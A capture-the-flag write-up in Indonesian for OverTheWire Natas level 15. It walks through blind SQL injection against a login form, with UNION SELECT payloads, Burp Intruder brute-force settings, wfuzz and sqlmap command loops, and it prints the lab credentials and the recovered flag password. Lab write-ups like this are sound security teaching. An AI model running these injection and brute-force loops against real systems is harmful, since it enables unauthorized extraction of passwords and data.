---
layout: default
level: 15
name_file: level
---

{% include level-section.html %}

# soal
Username: natas15 \
URL:      http://natas15.natas.labs.overthewire.org

# solve
- login with cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
- lalu saya melihat source codenya
  ![alt text](docs/images/image-38.png)
- disini saya mencoba beberapa parameter terlebih dahulu seperti
  ```bash
  "
  '
  ```
- dan ketika saya coba dengan '"' ini dikatakan error
  ![alt text](docs/images/image-39.png)
- ini adalah penggambaran sqlnya
  ```bash
  SELECT * FROM users where username = "<input>"
  SELECT * FROM users where username = "natas16" "1" = "1"

  ## mencari jumlah user ketemu di 1,2
  ## menggunakan tanda komen di akhir agar ; di php bisa dihilangkan
  SELECT * FROM users where username = "fafa" UNION ALL SELECT 1;#;
  SELECT * FROM users where username = "fafa" UNION ALL SELECT 1, 2;#;
  SELECT * FROM users where username = "fafa" UNION ALL SELECT 1, 2, 3, 4, 5;#";
  ## 1   => not exits FALSE
  ## 1,2 => exits TRUE

  ## karena sudah ketemu bahwa terdapat 2 kolom maka kita perlu UNION keduanya dari information schema
  SELECT 1,2 FROM users where username = "fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables;#";
  ## TRUE

  SELECT 1,2 FROM users where username = "fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "a";#";
  SELECT 1,2 FROM users where username = "fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "b";#";
  ## FALSE
  SELECT 1,2 FROM users where username = "fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "g";#";

  ## kita sudah tau ada tabble yang dimulai dari huruf g
  ## dan sebenernya ini tidak terlalu akurat
  ## jadi saya mencoba tambahan agar akurat
  SELECT 1,2 FROM users where username = "fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "g" \
  AND table_schema != "mysql" AND table_schema != "information_schema" AND table_schema != "performance_schema";#";
  ## FALSE

  ## dan ketika saya coba 1,1 u berhasil
  ## 2,1 s berhasil
  ```

- dan ini adalah sql yang saya coba
  ```bash
  natas16" "1" = "1
  fafa" UNION ALL SELECT 1;#
  fafa" UNION ALL SELECT 1, 2;#
  fafa" UNION ALL SELECT 1, 2, 3, 4, 5;#
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables;#
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "a";#
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "g";#
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "g" AND table_schema != "mysql" AND table_schema != "information_schema" AND table_schema != "performance_schema";#
  
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE substring(table_name,1,1) = "g" AND table_schema != "mysql" AND table_schema != "information_schema" AND table_schema != "performance_schema";#
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" AND table_schema != "performance_schema" AND substring(table_name,1,1) = "g";#
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" AND table_schema != "performance_schema" AND substring(table_name,1,1) = "u";#
  ## true  

  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" AND table_schema != "performance_schema" AND substring(table_name,2,1) = "u";#
  ```

## automation with burp suite
- saya mencoba burp suite intruder untuk mmempermudah mencari nama tablenye
  ![alt text](docs/images/image-40.png)
- setelah itu saya mengatur menjadi cluster bomb attack
  ![alt text](docs/images/image-41.png)
  - payload position = 1
  - payload type     = numbers
  - from 1 to 10
  ![alt text](docs/images/image-42.png)
  - payload position = 2
  - payload type     = brute force
  - minlength=1, maxlength=2
- lalu start attack dan tunggu hingga proses selesai
  ![alt text](docs/images/image-43.png)
- jika sudah kita bisa lakukan grep dengan option ini
  ![alt text](docs/images/image-44.png)
- jangan lupa ubah urutan ininya menjadi yang atas biar user exits tampil di atas jika sudah kita berhasil mendapatkan
  ![alt text](docs/images/image-45.png)
  ```users```

- setelah kita mengetahui table users saya mencari informasi lainya
  ```bash
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.columns WHERE table_name='users' AND SUBSTRING(column_name,1,1)='a';#
  fafa" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.columns WHERE table_name='users' AND SUBSTRING(column_name,1,1)='p';#
  ```
- lalu saya mencoba brute force otomatis lagi pake burp suite
  ![alt text](docs/images/image-47.png)
- jangan lupa di grep lagi
- jika sudah nanti outputnya akan seperti ini
  ![alt text](docs/images/image-48.png)
- lalu saya split responseya di cyberchef
  
  ```
  puasesrsnwaomrde
  1122334455667788

  password
  username
  ```

## brute force pass with wfuzz
- setelahh kita mengetaui nama column, kita hanya perlu membruteforce passwordnya
  ```bash
  fafa" UNION ALL SELECT 1,2 FROM users WHERE username = 'natas16' AND SUBSTRING(password,1,1) = 'a';#
  ```
- lalu saya coba melakukan brute force menggunakan burp suite dan mencoba menggunakan wfuzz
  ```bash
  echo -e "a\nb\nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\nm\nn\no\np\nq\nr\ns\nt\nu\nv\nw\nx\ny\nz\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n_\n$\n@" > chars
  echo -e "a\nb\nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\nm\nn\no\np\nq\nr\ns\nt\nu\nv\nw\nx\ny\nz\nA\nB\nC\nD\nE\nF\nG\nH\nI\nJ\nK\nL\nM\nN\nO\nP\nQ\nR\nS\nT\nU\nV\nW\nX\nY\nZ\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n_\n$\n@" > chars

  wfuzz -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" -w chars -d 'username=fafa" UNION ALL SELECT 1,2 FROM users WHERE username = "natas16" AND SUBSTRING(password,1,1) = "FUZZ";#' natas15.natas.labs.overthewire.org/index.php | grep -v 920
  # got 1 == h

  for i in {1..33}; do echo $i; done
  # 1
  # ...

  for i in {1..33}; do wfuzz -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" \
  -w chars -d "username=fafa\" UNION ALL SELECT 1,2 FROM users WHERE username = \"natas16\" AND SUBSTRING(password,$i,1) = \"FUZZ\";#" natas15.natas.labs.overthewire.org/index.php | grep -v 920  ; done
  # h
  # p
  # ...

  for i in {1..33}; do wfuzz -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" -w chars -d "username=fafa\" UNION ALL SELECT 1,2 FROM users WHERE username = \"natas16\" AND SUBSTRING(password,$i,1) = \"FUZZ\";#" natas15.natas.labs.overthewire.org/index.php | grep -v 920  ; done | grep 913
  # filternya ganda

  # namun terdapat masala ketika kita coba gunakan itu kemungkinann besar output hhuruf kecil dan besar akan sama begitu pula dengan length datanya kia perlu menambakan BINARY di sebelum = "a"
  # = \"FUZZ\" => = BINARY \"FUZZ\"
  for i in {1..33}; do wfuzz -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" -w chars -d "username=fafa\" UNION ALL SELECT 1,2 FROM users WHERE username = \"natas16\" AND SUBSTRING(password,$i,1) = BINARY \"FUZZ\";#" natas15.natas.labs.overthewire.org/index.php | grep -v 920

  for i in {1..33}; do wfuzz -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" -w chars -d "username=fafa\" UNION ALL SELECT 1,2 FROM users WHERE username = \"natas16\" AND SUBSTRING(password,$i,1) = BINARY \"FUZZ\";#" natas15.natas.labs.overthewire.org/index.php | grep -v 920  ; done

  for i in {1..33}; do wfuzz -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" -w chars -d "username=fafa\" UNION ALL SELECT 1,2 FROM users WHERE username = \"natas16\" AND SUBSTRING(password,$i,1) = BINARY \"FUZZ\";#" natas15.natas.labs.overthewire.org/index.php | grep -v 920  ; done | grep 913

  cat > wfuzz << EOF
  ---isi dengan output tadi
  EOF 

  cat wfuzz | awk '{print $9}' | tr -d "\"" | tr -d "\n"
  # hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
  ```

## brute force with burp suite
- tambahhkan intruder seperti biasa dengan cluster bom attack typenya
  - payload 1, number, from 1 to 33
  - payload 2, bruteforce "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUFWXYZ"
  ![alt text](docs/images/image-49.png)
- setelah menunggu hasilnya seperti ini
  

## automation with wfuzz (gagal)
```
wfuzz -z file,/usr/share/wordlists/sqlmap.txt -u "http://natas15.natas.labs.overthewire.org" -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" -d "username=FUZZ"
wfuzz -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u "http://natas15.natas.labs.overthewire.org" -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" -d "username=FUZZ"

# wfuzz
echo -e "a\nb\nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\nm\nn\no\np\nq\nr\ns\nt\nu\nv\nw\nx\ny\nz\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n_\n$\n@" > chars


# nyoba sqlmap namun tidak berhasil
sqlmap -u "http://natas15.natas.labs.overthewire.org" -H "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" --data="username=FUZZ" --dbs
sqlmap -u "http://natas15.natas.labs.overthewire.org" --headers="Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==" --data="username=FUZZ" --dbs --batch --flush-session -v 3
```

# flag
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo